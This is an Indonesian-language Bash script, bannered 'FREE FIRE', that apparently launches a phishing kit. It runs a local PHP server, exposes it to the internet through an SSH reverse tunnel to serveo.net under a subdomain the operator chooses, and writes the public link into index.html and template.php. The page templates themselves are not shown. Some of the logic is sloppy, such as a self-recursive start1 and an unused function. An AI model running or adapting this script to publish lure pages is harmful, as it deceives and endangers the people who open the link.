#!/bin/bash
banner() {
clear
printf "\n\e[5;35m        ____ ____ ____ ____    ____ _ ____ ____ 
        |___ |__/ |___ |___    |___ | |__/ |___ 
        |    |  \ |___ |___    |    | |  \ |___
 
   \e[7;32mCreated by Bartes Dwiky | FREE TUTORIAL Channel\e[0m\n\n"
}

checkfound() {
printf "\n\e[5;35m[-] \e[5;36mTekan \e[0;31mCtrl + C \e[5;36muntuk Menonaktifkan...\e[0m\n"
while [ true ]; do
sleep 1
done 
}
server() {
printf '\e[5;35m[-] \e[5;36mMembuat Link...'
if [[ $subdomain_resp == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
sleep 8
fi
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\n\e[5;35m[-] \e[5;36mLink :\e[0m\e[1;77m %s\n' $send_link
}
ngrok_server() {
checkfound
}
start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
start
start1
}
payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' index.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}
start() {
subdomain_resp=true
printf '\e[5;35m[-] \e[5;36mMasukan Nama Website : \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
server
payload
checkfound
}
banner
start1

